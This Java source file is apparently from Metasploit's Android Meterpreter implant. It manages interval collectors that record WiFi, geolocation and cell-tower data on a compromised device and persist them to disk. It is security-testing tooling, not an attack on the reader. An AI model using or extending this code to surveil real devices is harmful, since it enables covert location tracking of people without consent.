package com.metasploit.meterpreter;

import android.content.Context;

import java.util.Enumeration;
import java.util.Hashtable;

public class IntervalCollectionManager {

    private static final int COLLECT_TYPE_WIFI = 1;
    private static final int COLLECT_TYPE_GEO  = 2;
    private static final int COLLECT_TYPE_CELL = 3;

    private final Context context;
    private final Hashtable<Integer, IntervalCollector> collectors;

    public IntervalCollectionManager(Context context) {
        this.context = context;
        this.collectors = new Hashtable<Integer, IntervalCollector>();
    }

    public boolean createCollector(int type, long timeout) {
        IntervalCollector collector = this.getCollector(type);

        if (collector == null) {
          switch (type) {
              case COLLECT_TYPE_WIFI: {
                  collector = new WifiCollector(COLLECT_TYPE_WIFI, this.context, timeout);
                  break;
              }
              case COLLECT_TYPE_GEO: {
                  collector = new GeolocationCollector(COLLECT_TYPE_GEO, this.context, timeout);
                  break;
              }
              case COLLECT_TYPE_CELL: {
                  collector = new CellCollector(COLLECT_TYPE_CELL, this.context, timeout);
                  break;
              }
              default: {
                  return false;
              }
          }
        }

        if (collector != null) {
            this.addCollector(type, collector);
            return true;
        }

        return false;
    }

    public void start() {
        loadExistingCollectors();

        Enumeration ids = this.collectors.keys();

        while (ids.hasMoreElements()) {
            this.collectors.get(ids.nextElement()).start();
        }
    }

    private void loadExistingCollectors() {
        if (context == null) {
            return;
        }
        IntervalCollector collector = null;

        collector = new WifiCollector(COLLECT_TYPE_WIFI, this.context);
        if (collector.loadFromDisk()) {
            this.collectors.put(COLLECT_TYPE_WIFI, collector);
        }

        collector = new GeolocationCollector(COLLECT_TYPE_GEO, this.context);
        if (collector.loadFromDisk()) {
            this.collectors.put(COLLECT_TYPE_GEO, collector);
        }

        collector = new CellCollector(COLLECT_TYPE_CELL, this.context);
        if (collector.loadFromDisk()) {
            this.collectors.put(COLLECT_TYPE_CELL, collector);
        }
    }

    public void addCollector(int id, IntervalCollector collector) {
        this.collectors.put(id, collector);
        collector.start();
    }

    public boolean pauseCollector(int id) {
        IntervalCollector collector = this.collectors.get(id);
        if (collector == null) {
            return false;
        }

        collector.pause();
        return true;
    }

    public boolean resumeCollector(int id) {
        IntervalCollector collector = this.collectors.get(id);
        if (collector == null) {
            return false;
        }

        collector.resume();
        return true;
    }

    public IntervalCollector stopCollector(int id) {
        IntervalCollector collector = this.collectors.get(id);
        if (collector == null) {
            return null;
        }

        collector.stop();
        this.collectors.remove(id);
        return collector;
    }

    public IntervalCollector getCollector(int id) {
        return this.collectors.get(id);
    }

    public void stop() {
        Enumeration ids = this.collectors.keys();

        while (ids.hasMoreElements()) {
            this.collectors.get(ids.nextElement()).stop();
            // TODO: get them to write to storage
        }
    }
}
